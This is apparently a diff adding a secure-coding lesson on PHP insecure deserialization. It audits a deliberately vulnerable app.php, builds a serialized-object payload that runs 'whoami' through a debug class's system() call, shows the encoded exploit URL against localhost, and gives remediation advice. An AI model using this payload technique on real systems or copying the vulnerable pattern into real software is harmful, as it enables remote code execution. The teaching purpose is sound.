@@ -90,3 +90,182 @@ app.php
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+* Identifying and Exploiting Deserialization in PHP
+---------------------------------------------------
+In this exercise, we will take a simple PHP page from an internal development team and perform a security audit on the code. Let’s dive into the code.
+
+Starting with the first code block, we can see a basic class called Change_color. Looking through this code, we see two notable features, a private variable called $color and a __wakeup() 
+function call. Remember, this magic method will automatically execute once an object of the type Change_color is deserialized. Within this method is a basic call designed to print HTML to 
+the page. Looking closely, we can see there is no escaping performed on the $color variable within this class. If the code doesn’t have any sanitization upstream, it may introduce a 
+cross-site scripting vulnerability in the code!
+
+Moving on, we see two more notable lines. The first takes a basic GET parameter and assigns it to a variable; the second calls the unserialize() method on that parameter. Based on what 
+we’ve seen so far, this introduces a reflected cross-site scripting vulnerability to the application!
+
+Let’s look through the code and see if we can find anything else concerning it.
+
+Continuing, we see another class with a comment. The Debug_class_remove_from_prod class is similar to the last class. It has a variable and a __wakeup() function call. This function call 
+is a bit more interesting, though. Instead of a basic echo, this has a call to the system() command! This dangerous function call within the __wakeup() function, combined with the use of 
+the unserialize() function, is everything we need for remote code execution! Let’s generate a payload!
+
+To generate a payload, we must create a class identical in name to the dangerous class and provide it with the necessary variables. In this case, to generate an object designed to execute 
+the whoami command, we can change the following code in the editor:
+
+	class Debug_class_remove_from_prod
+    		{
+       			private $hook;   
+         
+       			function __wakeup(){
+        			system($this->hook);
+           		}
+    		}
+
+to the following code below to generate the object and print the serialized string:
+
+	class Debug_class_remove_from_prod
+    		{
+        		private $hook = 'whoami';
+    		}
+
+	$our_object = new Debug_class_remove_from_prod();
+	print_r(serialize($our_object));
+
+Once we execute this, our returned string will be O:28:"Debug_class_remove_from_prod":1:{s:34:"Debug_class_remove_from_prodhook";s:6:"whoami";}
+
+Now, let’s change our code back to what we had before:
+
+	class Debug_class_remove_from_prod
+    		{
+       			private $hook;   
+         
+       			function __wakeup(){
+        			system($this->hook);
+           		}
+    		}
+
+Once you change the code, try opening 
+http://localhost/app.php?color=O%3A28%3A%22Debug_class_remove_from_prod%22%3A1%3A%7Bs%3A34%3A%22%00Debug_class_remove_from_prod%00hook%22%3Bs%3A6%3A%22whoami%22%3B%7D in the browser.
+
+As you will be able to see, we are able to obtain the user,ccuser, in the browser.
+
+We were able to exploit and execute the whoami command by passing the serialized object we received when we changed and ran the code. Our command executed the unserialize() function and 
+ran on the parameter.
+
+Let’s explore how to address the issue with deserialization.
+
+app.php
+-------
+<?php
+	class Change_color
+	{
+		private $color;
+
+		function __wakeup(){
+			echo '<body style="background-color:' . $this->color . '">';
+		}
+	}
+
+
+	$deserial_content = $_GET['color'];
+	unserialize($deserial_content);
+
+	echo "Welcome to Our Registration Page!";
+	echo "<br>";
+	echo "Come back after our security assessment for more information!";
+
+	//Remove this class before the security assessment!
+	class Debug_class_remove_from_prod
+	{
+		private $hook;   
+		 
+		function __wakeup(){
+			system($this->hook);
+		}
+	}
+?>
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+* Remediating Software and Data Integrity Issues
+------------------------------------------------
+In the last example, we saw how deserialization could introduce environmental risk. Now, it is important we discuss how to prevent these issues.
+
+Fortunately, deserialization issues are usually simple to address. We need to avoid deserializing user’s input.
+
+In most cases, there are usually safer alternatives than serialization. For example, in many situations, JSON provides a similar structure, but in most languages, it does not introduce the same level of risk. It is important to note some languages and libraries, such as the .NET JSON.NET library, are susceptible to these issues under certain conditions.
+
+By transferring information differently and avoiding deserializing user’s input, we can better secure our apps.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+* Conclusion
+------------
+Throughout the lesson, we saw how deserializing user’s input could impact an application’s overall security. By failing to maintain our software and data integrity, we expose ourselves to 
+serious risks.
+
+While handling user’s input carefully is certainly one way to reduce our risk, software, and data integrity failures, organizations must be extremely contentious when importing 
+third-party plugins and libraries, working with CDNs, and implementing update features.
+
+As code becomes more modular and outsourced, the risk may increase tremendously if proper care is not taken to review outsourced content.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
